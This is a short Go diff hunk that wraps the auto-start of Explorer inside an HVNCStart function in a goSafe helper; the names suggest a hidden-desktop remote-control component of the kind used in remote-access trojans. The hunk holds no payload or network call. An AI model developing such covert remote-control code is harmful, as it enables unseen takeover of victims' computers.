@@ -38,11 +38,11 @@ func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
 	}
 
 	if autoStartExplorer {
-		go func() {
+		goSafe("hvnc auto-start explorer", nil, func() {
 			if err := capture.HVNCAutoStartExplorer(); err != nil {
 				log.Printf("hvnc: auto-start explorer error: %v", err)
 			}
-		}()
+		})
 	}
 
 	ticker := time.NewTicker(interval)
